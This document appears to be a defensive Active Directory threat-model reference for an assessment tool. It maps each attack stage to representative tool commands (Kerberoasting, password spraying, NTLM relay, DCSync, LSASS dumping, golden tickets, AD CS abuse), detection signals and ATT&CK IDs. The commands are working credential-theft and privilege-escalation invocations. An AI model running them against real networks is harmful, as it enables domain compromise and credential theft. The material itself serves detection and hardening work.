# AD_Bible — Active Directory Enumeration & Attack-Path Reference (Blue-Team Threat Model)

> **Purpose & framing.** This is a defensive reference. It catalogues the
> enumeration techniques and attack paths that real adversaries (and OSCP-style
> operators) use against on-prem Active Directory, so that the `ad-recon`
> documentation/assessment tool can be measured against them and so blue teams
> know what to detect, harden, and validate.
>
> The commands shown are the **publicly documented, standard invocations** of
> well-known security tools (Impacket, BloodHound, Rubeus, Certipy, PowerView,
> NetExec, mimikatz, Responder, etc.), aggregated from the public sources indexed
> at the end. Nothing here is novel offense. Use it for detection engineering,
> hardening, and **non-destructive** post-run validation (MITRE ATT&CK / Atomic
> Red Team), per the `ad-recon` SCOPE.
>
> **Legend per technique:** `CMD` = representative command(s); `SIGNAL` = what a
> defender enumerates/detects; `ATT&CK` = MITRE technique; `ESC#` = AD CS path;
> `[src]` = source (see §12 index).

---

## 0. Kill-chain model used here

1. Unauthenticated / external enumeration
2. Authenticated enumeration (low-priv domain user)
3. Credential access
4. Domain privilege escalation
5. Lateral movement
6. Domain dominance & credential dumping
7. Trusts & cross-domain / forest
8. AD-adjacent infrastructure (chained)
9. Notable CVEs
10. Tooling glossary
11. `ad-recon` coverage map (delta) → see companion file
12. Source URL index

---

## 1. Unauthenticated / external enumeration

**Host & service discovery.**
`CMD` `nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 <subnet>` (88/389/445/3268/9389 ⇒ DC).
`SIGNAL` Identify DCs, CA (AD CS web enrollment 80/443 `/certsrv`), LDAP/GC. `[PATT/IATT][cavementech][brianlam38]`

**SMB null / guest sessions.**
`CMD` `enum4linux-ng -A <dc>` · `smbclient -L //<dc>/ -N` · `rpcclient -U "" -N <dc>` then `enumdomusers`, `querydominfo`, `enumdomgroups`.
`SIGNAL` Anonymous SMB/RPC enumeration of users/groups/policy; should be denied. `[PATT/IATT][intotheewild][hackerask]`

**RID cycling.**
`CMD` `lookupsid.py 'anonymous'@<dc>` · `crackmapexec smb <dc> -u '' -p '' --rid-brute` (NetExec equivalent).
`SIGNAL` Enumerates SAM/domain principals by RID without creds. `[PATT/IATT][duckwrites]`

**LDAP anonymous bind.**
`CMD` `ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local"` · `windapsearch -d corp.local --dc <dc> -U`.
`SIGNAL` Anonymous LDAP read; naming contexts; `dsHeuristics` anonymous-access flag. `[PATT/IATT][cavementech]`

**DNS.**
`CMD` `dig @<dc> corp.local ANY` · `dnsrecon -d corp.local -t axfr` · query `_ldap._tcp.dc._msdcs`.
`SIGNAL` SRV records reveal DCs/sites; zone-transfer exposure; ADIDNS. `[PATT/IATT]`

**Kerberos user enumeration (no creds).**
`CMD` `kerbrute userenum -d corp.local --dc <dc> users.txt`.
`SIGNAL` Pre-auth username validation via AS-REQ responses (event 4768). `ATT&CK` T1589/T1087. `[intotheewild][flashgenius]`

**AS-REP roasting without creds (if usernames known).**
`CMD` `GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <dc>`.
`SIGNAL` Accounts with `DONT_REQ_PREAUTH`; AS-REP crackable offline. `ATT&CK` T1558.004. `[PATT/IATT][brianlam38][duckwrites]`

---

## 2. Authenticated enumeration (valid low-priv credentials)

**Graph collection (the core).**
`CMD` `bloodhound-python -u user -p pass -d corp.local -ns <dc> -c All` · Windows: `SharpHound.exe -c All` (CE: match version) · analyze in BloodHound.
`SIGNAL` Transitive ACL/group/session/delegation paths to Tier 0 — the single most important enumeration. `ATT&CK` T1069/T1087/T1482. `[PATT/IATT][intotheewild][infosecwriteups][awesome-oscp]`

**PowerView / SharpView (Windows).**
`CMD` `Get-DomainUser -SPN` · `Get-DomainComputer -Unconstrained` · `Get-DomainObjectAcl -ResolveGUIDs` · `Find-InterestingDomainAcl` · `Get-DomainTrust` · `Get-DomainGPO` · `Get-NetSession`.
`SIGNAL` Users, SPNs, delegation, ACLs, trusts, GPOs, sessions. `[PATT/IATT][brianlam38][hackwithmike]`

**LDAP dumps (Linux).**
`CMD` `ldapdomaindump -u 'corp\user' -p pass <dc>` · `windapsearch -d corp.local -u user@corp.local -p pass --da` (domain admins).
`SIGNAL` Full object/attribute dump. `[PATT/IATT][cavementech]`

**Host/share discovery.**
`CMD` `netexec smb <subnet> -u user -p pass --shares` · `smbmap -H <host> -u user -p pass` · `Snaffler.exe` / `manspider` for sensitive files.
`SIGNAL` Open/over-permissioned shares; SYSVOL/NETLOGON; creds in files. `ATT&CK` T1135/T1039. `[PATT/IATT][hackerask]`

**Targeted attribute mining.**
`CMD` `Get-DomainUser -Properties samaccountname,description | ?{$_.description -match 'pwd|pass'}` · search `info`/`comment`.
`SIGNAL` Cleartext secrets in `description`/`info`/`comment`. `ATT&CK` T1552. `[PATT/IATT]`

---

## 3. Credential access

**Kerberoasting.**
`CMD` `GetUserSPNs.py corp.local/user:pass -request -dc-ip <dc>` · `Rubeus.exe kerberoast /nowrap` → crack with `hashcat -m 13100`.
`SIGNAL` User accounts with SPNs (esp. `adminCount=1`), RC4 tickets, weak passwords. `ATT&CK` T1558.003. `[PATT/IATT][brianlam38][duckwrites][flashgenius]`

**AS-REP roasting.**
`CMD` `GetNPUsers.py corp.local/user:pass -request` · `Rubeus.exe asreproast /nowrap` → `hashcat -m 18200`.
`SIGNAL` `DONT_REQ_PREAUTH` accounts. `ATT&CK` T1558.004. `[PATT/IATT]`

**Password spraying.**
`CMD` `kerbrute passwordspray -d corp.local users.txt 'Season2025!'` · `netexec smb <dc> -u users.txt -p 'Spring2025!' --continue-on-success`.
`SIGNAL` Lockout policy, 4625/4771 bursts; weak/seasonal passwords. `ATT&CK` T1110.003. `[intotheewild][systemweakness]`

**LLMNR / NBT-NS / mDNS poisoning + relay.**
`CMD` `responder -I eth0 -wd` (capture NetNTLMv2) → `hashcat -m 5600`; or relay: `ntlmrelayx.py -tf targets.txt -smb2support` (+ `mitm6` for IPv6/WPAD).
`SIGNAL` LLMNR/NBT-NS/mDNS enabled; SMB signing not required; IPv6 WPAD. `ATT&CK` T1557.001. `[PATT/IATT - MITM and Relay][hackerask]`

**GPP cpassword (MS14-025).**
`CMD` `findstr /S /I cpassword \\<fqdn>\sysvol\<fqdn>\policies\*.xml` → `gpp-decrypt <blob>`.
`SIGNAL` AES key is public; any user can read SYSVOL. `ATT&CK` T1552.006. `[PATT/IATT - GPP][duckwrites]`

**LAPS read.**
`CMD` `netexec ldap <dc> -u user -p pass -M laps` · `Get-DomainObject -Properties ms-Mcs-AdmPwd`.
`SIGNAL` Principals with read rights on `ms-Mcs-AdmPwd` / `msLAPS-Password`. `[PATT/IATT - LAPS]`

**gMSA read.**
`CMD` `gMSADumper.py -u user -p pass -d corp.local` (reads `msDS-ManagedPassword` if `PrincipalsAllowedToRetrieveManagedPassword`).
`SIGNAL` Over-broad gMSA retrieval rights. `[PATT/IATT - GMSA]`

**Timeroasting.**
`CMD` `timeroast.py <dc>` (NTP-based computer-account hash retrieval).
`SIGNAL` Legacy NTP authentication exposure. `[PATT/IATT - Timeroasting]`

**DPAPI / on-host secrets.**
`CMD` `mimikatz dpapi::*` · `SharpDPAPI` · browser/cred-vault extraction.
`SIGNAL` Post-foothold; protect with Credential Guard. `ATT&CK` T1555. `[PATT/IATT - DPAPI]`

---

## 4. Domain privilege escalation

**ACL / ACE abuse (the BloodHound payoff).**
`CMD` (PowerView) `Add-DomainObjectAcl`, `Set-DomainUserPassword` (ForceChangePassword), `Add-DomainGroupMember` (AddMember), `Set-DomainObject` to add SPN (GenericWrite → targeted Kerberoast); `aclpwn`/`Invoke-ACLPwn`.
`SIGNAL` GenericAll/GenericWrite/WriteDACL/WriteOwner/ForceChangePassword on Tier 0 objects; AdminSDHolder. `ATT&CK` T1222/T1098. `[PATT/IATT - ACL/ACE][infosecwriteups]`

**Shadow Credentials.**
`CMD` `Whisker.exe add /target:victim$` (or `pyWhisker`) writes `msDS-KeyCredentialLink` → `Rubeus asktgt /certificate:` / `gettgtpkinit.py`.
`SIGNAL` Write rights to `msDS-KeyCredentialLink`; PKINIT. `ATT&CK` T1556. `[PATT/IATT - Shadow Credentials]`

**Unconstrained delegation.**
`CMD` Coerce a DC (`PetitPotam.py` / `printerbug.py`) to auth to the compromised unconstrained host; `Rubeus.exe monitor` captures the DC TGT → DCSync.
`SIGNAL` Non-DC computers/users with `TRUSTED_FOR_DELEGATION`. `ATT&CK` T1558. `[PATT/IATT - Unconstrained]`

**Constrained delegation.**
`CMD` `Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target`.
`SIGNAL` `msDS-AllowedToDelegateTo`; with protocol transition (S4U2Self) ⇒ impersonate anyone. `ATT&CK` T1558. `[PATT/IATT - Constrained]`

**Resource-Based Constrained Delegation (RBCD).**
`CMD` `Powermad New-MachineAccount` (uses MAQ) → set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target → `Rubeus s4u`. Linux: `rbcd.py`, `addcomputer.py`, `getST.py`.
`SIGNAL` Write rights on a computer's `msDS-AllowedToActOnBehalfOf...`; `MachineAccountQuota>0`. `ATT&CK` T1098. `[PATT/IATT - RBCD]`

**AD CS — ESC1…ESC16.**
`CMD` `certipy find -u user@corp.local -p pass -dc-ip <dc> -vulnerable` · ESC1: `certipy req -ca <CA> -template <vuln> -upn administrator@corp.local` · ESC8: `certipy relay -target <CA-web>` ; Windows: `Certify.exe find /vulnerable`.
`SIGNAL` Enrollee-supplies-subject + auth EKU + no approval (ESC1); `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6); vulnerable template/CA/object ACLs (ESC4/5/7); web-enrollment relay (ESC8); NTAuth/CA-cert (ESC11/16). `ATT&CK` T1649. `[PATT/IATT - ADCS]`

**samAccountName spoofing / NoPAC (CVE-2021-42278/42287).**
`CMD` `sam_the_admin.py` / `noPac.py corp.local/user:pass -dc-ip <dc> -dump`.
`SIGNAL` MAQ>0 + unpatched DCs ⇒ machine→DC escalation. `[PATT/IATT - NoPAC]`

**MS14-068 (legacy PAC forgery).**
`CMD` `goldenPac.py` / `ms14-068` tooling. `SIGNAL` Unpatched pre-2014 DCs. `[PATT/IATT - MS14-068]`

---

## 5. Lateral movement

**Pass-the-Hash.**
`CMD` `netexec smb <host> -u admin -H <NTLM>` · `psexec.py -hashes :<NTLM> corp/admin@<host>` · `wmiexec.py` · `evil-winrm -i <host> -u admin -H <NTLM>`.
`SIGNAL` NTLM auth from unexpected hosts (4624 type 3, 4776); local-admin reuse. `ATT&CK` T1550.002. `[PATT/IATT - PtH][brianlam38][hackerask]`

**OverPass-the-Hash / Pass-the-Ticket.**
`CMD` `Rubeus.exe asktgt /user:u /rc4:<hash> /ptt` · `mimikatz sekurlsa::pth` · `Rubeus ptt /ticket:<b64>`; Linux `export KRB5CCNAME=...` + `-k`.
`SIGNAL` Kerberos use from anomalous hosts; RC4 etype. `ATT&CK` T1550.002/.003. `[PATT/IATT - OverPass]`

**Token impersonation.**
`CMD` `mimikatz token::elevate` · `Incognito` · `PrintSpoofer`/`RoguePotato` (SeImpersonate).
`SIGNAL` SeImpersonatePrivilege on service accounts. `ATT&CK` T1134. `[PATT/IATT][hackwithmike]`

**Remote execution channels.**
`CMD` `psexec.py`/`smbexec.py`/`wmiexec.py`/`atexec.py`/`dcomexec.py`; `evil-winrm`; `Invoke-Command`.
`SIGNAL` Service/scheduled-task/DCOM/WinRM creation events (7045, 4698, 4624). `ATT&CK` T1021/T1569. `[PATT/IATT - DCOM]`

---

## 6. Domain dominance & credential dumping

**DCSync.**
`CMD` `mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt` · `secretsdump.py -just-dc corp/admin@<dc>`.
`SIGNAL` Non-DC principals with `DS-Replication-Get-Changes`/`-All` (replication ACL); 4662 with replication GUIDs. `ATT&CK` T1003.006. `[PATT/IATT - NTDS][infosecwriteups]`

**NTDS.dit extraction.**
`CMD` `ntdsutil "ac i ntds" "ifm" "create full c:\temp"` · `vssadmin`/`diskshadow` shadow copy · `secretsdump.py -ntds ntds.dit -system system LOCAL`.
`SIGNAL` Volume-shadow/`ntdsutil` on DC; backup-operator abuse. `ATT&CK` T1003.003. `[PATT/IATT - NTDS]`

**LSASS dumping.**
`CMD` `mimikatz sekurlsa::logonpasswords` · `comsvcs.dll MiniDump` · `nanodump`/`procdump`.
`SIGNAL` LSASS access (10/4656); mitigate with RunAsPPL/Credential Guard. `ATT&CK` T1003.001. `[PATT/IATT - Mimikatz]`

**Golden Ticket.**
`CMD` `mimikatz kerberos::golden /user:x /domain:corp.local /sid:<dom-sid> /krbtgt:<hash> /ptt` · `ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain corp.local Administrator`.
`SIGNAL` krbtgt password age; anomalous TGT lifetimes; **detect via krbtgt double-reset hygiene**. `ATT&CK` T1558.001. `[PATT/IATT - Tickets]`

**Silver / Diamond / Sapphire Ticket.**
`CMD` `mimikatz kerberos::golden /sid /target /service:cifs /rc4:<svc-hash> /user:` (silver); Rubeus `diamond`.
`SIGNAL` Forged service tickets; service-account key hygiene. `ATT&CK` T1558.002. `[PATT/IATT - Tickets]`

**DCShadow / Skeleton Key / DSRM.**
`CMD` `mimikatz lsadump::dcshadow` · `misc::skeleton` · DSRM logon enablement.
`SIGNAL` Rogue DC registration; `DsrmAdminLogonBehavior` registry; LSASS patching. `ATT&CK` T1207/T1556. `[PATT/IATT - DSRM]`

**Golden gMSA.**
`CMD` Compute gMSA password from KDS root key (`GoldenGMSA.exe`).
`SIGNAL` KDS root key compromise (unrotatable). `[PATT/IATT - GMSA]`

**Persistence via ACL / AdminSDHolder / GPO.**
`CMD` Add ACE to AdminSDHolder (re-applied by SDProp); add rights via GPO; certificate persistence (forge with stolen CA key).
`SIGNAL` AdminSDHolder ACL drift; unexpected GPO edit rights; CA private-key exposure. `ATT&CK` T1098/T1484. `[PATT/IATT - ACL]`

---

## 7. Trusts & cross-domain / forest

**Trust enumeration.**
`CMD` `Get-DomainTrust` · `nltest /domain_trusts` · `bloodhound -c Trusts`.
`SIGNAL` Direction, transitivity, SID-filtering/quarantine, selective auth. `ATT&CK` T1482. `[PATT/IATT - Trust]`

**Child → parent (intra-forest).**
`CMD` Golden ticket with Enterprise Admins SID via SID history / ExtraSids: `ticketer.py -extra-sid <root-EA-sid>`.
`SIGNAL` Intra-forest trust ⇒ no SID filtering by default; child DC compromise = forest. `[PATT/IATT - SID Hijacking]`

**Inter-forest trust ticket.**
`CMD` Forge inter-realm TGT with trust key (`mimikatz kerberos::golden /service:krbtgt /target:<other>`).
`SIGNAL` Trust key; SID filtering enforcement across forest trust. `[PATT/IATT - Trust Ticket]`

**PAM trust abuse.** `SIGNAL` Bastion/PAM trust shadow-principal mapping. `[PATT/IATT - PAM]`

---

## 8. AD-adjacent infrastructure (commonly chained)

- **AD CS web enrollment relay (ESC8).** Coerce DC auth → relay to `/certsrv` → DC cert → DCSync. `[PATT/IATT - ADCS]`
- **SCCM/MECM.** Network Access Account recovery, site takeover, client push relay (`SharpSCCM`, `sccmhunter`). `[PATT/IATT - SCCM]`
- **WSUS.** Unsigned/HTTP update injection to push commands. `[PATT/IATT - WSUS]`
- **Exchange (PrivExchange).** `PushSubscription` → relay Exchange machine auth to LDAP for DCSync rights. `[PATT/IATT - PrivExchange]`
- **ADFS.** Token-signing key theft → Golden SAML. `[PATT/IATT - ADFS]`
- **ADIDNS.** Authenticated users add DNS records (wildcard/WPAD) for spoofing. `[PATT/IATT - ADIDNS]`
- **RODC.** Cached-credential and msDS-RevealedList abuse. `[PATT/IATT - RODC]`

---

## 9. Notable CVEs (config + patch axis)

- **ZeroLogon — CVE-2020-1472.** Netlogon crypto flaw → reset DC machine account. `SIGNAL` DC patch level. `[PATT/IATT - ZeroLogon]`
- **PrintNightmare — CVE-2021-1675 / 34527.** Spooler RCE/LPE. `SIGNAL` Spooler running on DC; patch. `[PATT/IATT - PrintNightmare]`
- **NoPAC — CVE-2021-42278/42287.** `SIGNAL` MAQ>0 + patch. (see §4)
- **PetitPotam — MS-EFSRPC coercion.** Pairs with ESC8/unconstrained. `SIGNAL` EFSRPC reachable; NTLM relay protections.
- **PrivExchange / MS14-068 / SamAccountName.** `SIGNAL` patch state. `→` correlate via VulnCheck KEV.

---

## 10. Tooling glossary

`Impacket` (GetUserSPNs/GetNPUsers/secretsdump/ntlmrelayx/psexec/wmiexec/lookupsid/ticketer) · `BloodHound`+`SharpHound`/`bloodhound-python` (graph) · `PowerView`/`SharpView` (LDAP recon) · `Rubeus` (Kerberos) · `Certipy`/`Certify` (AD CS) · `mimikatz` (creds/tickets) · `Responder`/`mitm6` (poisoning) · `NetExec`/`CrackMapExec` (mass SMB/LDAP/WinRM) · `kerbrute` (Kerberos enum/spray) · `evil-winrm` (WinRM shell) · `Whisker`/`pyWhisker` (shadow creds) · `Powermad` (machine accounts) · `gMSADumper` · `Snaffler` (file hunting) · `enum4linux-ng`/`ldapdomaindump`/`windapsearch` (enum). `[awesome-oscp][PATT/IATT]`

---

## 11. `ad-recon` coverage map

See companion file **AD_Bible_Delta_to_ADRecon.md** for the technique-by-technique
coverage matrix and the recommended scope additions.

---

## 12. Source URL index

Reviewed in depth for this document:

- PayloadsAllTheThings — Active Directory Attack: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- InternalAllTheThings — Active Directory (current home of the above): https://github.com/swisskyrepo/InternalAllTheThings/ and https://swisskyrepo.github.io/InternalAllTheThings/active-directory/

Provided source list (OSCP / AD cheatsheets & methodology):

- https://github.com/crtvrffnrt/OSCP-Checklist-Cheatsheet2024
- https://github.com/intotheewild/OSCP-Checklist
- https://github.com/intotheewild/OSCP-Checklist/blob/main/04.%20Active%20Directory%20Enumeration.md
- https://github.com/0x4D31/awesome-oscp
- https://hackerask.com/posts/pentesting-cheatsheet/
- https://hackwithmike.gitbook.io/oscp/methodology/oscp-methodology
- https://duckwrites.medium.com/conquering-active-directory-for-oscp-essential-techniques-and-strategies-part-1-6f44d5469b47
- https://duckwrites.medium.com/conquering-active-directory-for-oscp-essential-techniques-and-strategies-part-2-09461e37b45b
- https://duckwrites.medium.com/conquering-active-directory-for-oscp-essential-techniques-and-strategies-part-3-a719c6b81ad8
- https://systemweakness.com/6-vs-1-battle-my-oscp-strategy-dd23cc0e912b
- https://notes.cavementech.com/pentesting-quick-reference/active-directory
- https://flashgenius.net/oscp-ad-cheat-sheet
- https://medium.com/@carlosbudiman/oscp-proving-grounds-vault-hard-active-directory-fb8ae465667a
- https://github.com/brianlam38/OSCP/blob/main/cheatsheet-active-directory.md
- https://infosecwriteups.com/how-i-attacked-active-directory-during-oscp-labs-and-what-tools-actually-worked-8a10e12930a4
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md  (via provided redirect)
- https://github.com/AD-Attacks/AD-Attacks-by-Service  (via provided redirect)
- https://github.com/ErdemOzgen/ActiveDirectoryAttacks  (via provided redirect)
- https://github.com/reatva/Vulnerable-Active-Directory-Lab  (via provided redirect)

Not used (paywalled / document-host, copyright — excluded deliberately):

- https://www.scribd.com/document/904162995/...
- https://www.studocu.com/in/document/...

> Source tags used inline ([PATT/IATT], [intotheewild], [brianlam38], [duckwrites],
> [cavementech], [hackerask], [hackwithmike], [systemweakness], [flashgenius],
> [infosecwriteups], [awesome-oscp]) map to the URLs above. Where a technique is
> documented near-identically across many sources, it is tagged [PATT/IATT] as the
> canonical superset.
